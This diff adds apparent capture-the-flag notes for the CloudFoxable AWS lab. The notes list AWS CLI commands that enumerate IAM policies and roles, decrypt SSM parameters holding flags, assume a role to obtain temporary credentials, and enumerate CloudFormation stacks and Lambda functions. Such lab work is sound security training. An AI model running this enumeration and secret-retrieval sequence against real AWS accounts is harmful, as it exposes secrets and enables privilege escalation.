@@ -1,0 +1,53 @@
+aws --profile ##### sts get-caller-identity
+   # if the result has arn:aws:iam::098660501950:user/username
+aws iam list-user-policies --user-name #username --profile #####
+   # Check for attached policies for that user
+aws iam list-attached-user-policies --user-name username --profile #####
+   # pick the arn in the list 
+aws iam get-policy --policy-arn "arn:aws:iam::098660501950:policy/its-a-secret-policy" --profile #####
+      # Check for version id , for example: "DefaultVersionId": "v1"
+      # query the version-id 
+aws iam get-policy-version --policy-arn "arn:aws:iam::098660501950:policy/its-a-secret-policy" --profile ##### --version-id v1
+      -> this will get the "Action", for example, "ssm:GetParameter" and arn
+aws ssm describe-parameters --profile #####
+aws ssm get-parameter --name "/cloudfoxable/flag/its-a-secret" --profile ##### --with-decryption
+
+
+-> check for roles
+aws iam --profile ##### list-roles
+
+-> get the role you want
+{
+            "Path": "/",
+            "RoleName": "Ertz",
+            "RoleId": "AROARN6E7ZG7LNKXS47DP",
+            "Arn": "arn:aws:iam::098660501950:role/Ertz",
+            "CreateDate": "2023-08-30T18:19:39+00:00",
+            "AssumeRolePolicyDocument": {
+                "Version": "2012-10-17",
+                "Statement": [
+                    {
+                        "Effect": "Allow",
+                        "Principal": {
+                            "AWS": "arn:aws:iam::098660501950:user/ctf-starting-user"
+                        },
+                        "Action": "sts:AssumeRole"
+                    }
+                ]
+            },
+            "MaxSessionDuration": 3600
+        }
+-> check the "sts:AssumeRole" this will give the AWS credential
+aws sts assume-role --role-arn "arn:aws:iam::098660501950:role/Ertz" --role-session-name test --profile cloudfoxable
+
+aws --profile Ertz ssm get-parameter --name "/cloudfoxable/flag/its-another-secret" --region us-west-2 --with-decryption
+
+aws cloudformation describe-stacks --profile ramos --region us-west-2
+aws cloudformation list-stack-resources --stack-name "cloudformationStack" --profile ramos --region us-west-2
+aws cloudformation get-template --stack-name "cloudformationStack" --profile ramos --region us-west-2
+
+aws lambda list-functions --profile cloudfoxable
+
+
+
+
